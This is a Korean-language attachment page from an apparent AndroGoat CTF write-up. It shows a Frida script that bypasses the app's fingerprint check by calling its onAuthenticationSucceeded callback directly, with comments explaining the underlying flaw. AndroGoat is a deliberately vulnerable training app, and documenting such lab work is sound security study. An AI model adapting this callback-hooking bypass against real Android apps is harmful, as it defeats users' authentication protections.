---
{"title":"bypass-biometric.js","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"frida/bypass-biometric.js · 사용한 Frida 스크립트 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `frida/bypass-biometric.js` · 사용한 Frida 스크립트.

<pre><code>// 생체 인증 우회 (직접 호출 방식)
// 취약점: onAuthenticationSucceeded 가 CryptoObject 와 무관하게 성공 UI 를 띄운다.
// 지문이 하나도 등록돼 있지 않아도, 성공 콜백을 직접 부르면 통과된다.
Java.perform(function () {
    var AuthResult = Java.use(&quot;androidx.biometric.BiometricPrompt$AuthenticationResult&quot;);

    Java.choose(&quot;owasp.sat.agoat.BioMetricAuthActivity$onCreate$1&quot;, {
        onMatch: function (cb) {
            Java.scheduleOnMainThread(function () {
                try {
                    var result = AuthResult.$new(null, 2);
                    cb.onAuthenticationSucceeded(result);
                    console.log(&quot;[bio-bypass] 지문 미등록 상태에서 onAuthenticationSucceeded 직접 호출 → 성공&quot;);
                } catch (e) {
                    console.log(&quot;[err] &quot; + e);
                }
            });
        },
        onComplete: function () { console.log(&quot;[*] callback 탐색 완료&quot;); }
    });
});
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
